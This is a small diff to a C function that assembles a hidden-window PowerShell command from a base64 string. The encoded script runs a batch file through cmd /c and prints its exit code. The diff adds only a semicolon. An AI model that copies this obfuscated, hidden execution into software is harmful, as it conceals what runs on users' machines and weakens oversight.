@@ -506,7 +506,7 @@ char* sys_easy_mode_tp(void) {
         "dAAnACwAJwBjAG0AZAAnACwAJwAvAGMAJwAsACQAYgBhAHQAIAAtAFcAYQBpAHQAIAAtAFcAaQBuAGQA"
         "bwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuACAALQBQAGEAcwBzAFQAaAByAHUACgBXAHIAaQB0AGUA"
         "LQBIAG8AcwB0ACAAIgBFAGEAcwB5ACAAbQBvAGQAZQAgAFQAUAAgAGUAeABpAHQAIABjAG8AZABlADoA"
-        "IAAkACgAJABwAHIAbwBjAC4ARQB4AGkAdABDAG8AZABlACkAIgAKAA=="
+        "IAAkACgAJABwAHIAbwBjAC4ARQB4AGkAdABDAG8AZABlACkAIgAKAA==";
     snprintf(result, sizeof(result),
         "powershell -WindowStyle Hidden -EncodedCommand %s", encoded);
     return result;
